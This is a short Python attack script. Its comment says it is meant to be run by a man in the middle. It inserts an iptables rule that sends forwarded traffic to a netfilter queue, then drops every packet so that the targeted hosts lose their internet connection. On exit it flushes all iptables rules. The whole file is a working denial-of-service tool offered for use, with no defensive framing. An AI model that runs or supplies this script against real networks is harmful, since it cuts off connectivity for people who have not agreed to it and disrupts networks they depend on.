#!/usr/bin/env python

import netfilterqueue
import subprocess

# become the man in the middleand just drop all packets thereby cutting off internet connection of targets

def process_packet(packet):
    print(packet)
    #packet.accept()
    packet.drop()
try:
    print("[+] Cutting internet connection for all hosts!")
    print("[+] Creating IP tables")
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] Detected CTRL+C ")
    print("[+] Flushing IP tables")
    subprocess.call("iptables --flush",shell=True)
    print("[+] Quitting")


